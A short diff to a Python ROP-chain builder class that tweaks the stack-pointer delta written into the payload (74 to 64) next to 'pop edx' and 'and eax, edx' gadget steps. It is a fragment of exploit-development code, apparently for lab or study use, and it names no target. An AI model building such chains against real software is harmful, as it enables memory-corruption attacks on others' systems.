@@ -251,7 +251,7 @@ class ROP:
         #TODO: PUT ESP_DELTA INTO EDX
         # esp_delta = 74 -> change this
         self.pop_register("edx")
-        sys.stdout.buffer.write((74).to_bytes(4, byteorder='little'))
+        sys.stdout.buffer.write((64).to_bytes(4, byteorder='little'))
         self.count += 1
         # and eax, esp_delta
         self.and_eax_register("edx") # and eax, edx (esp_delta)
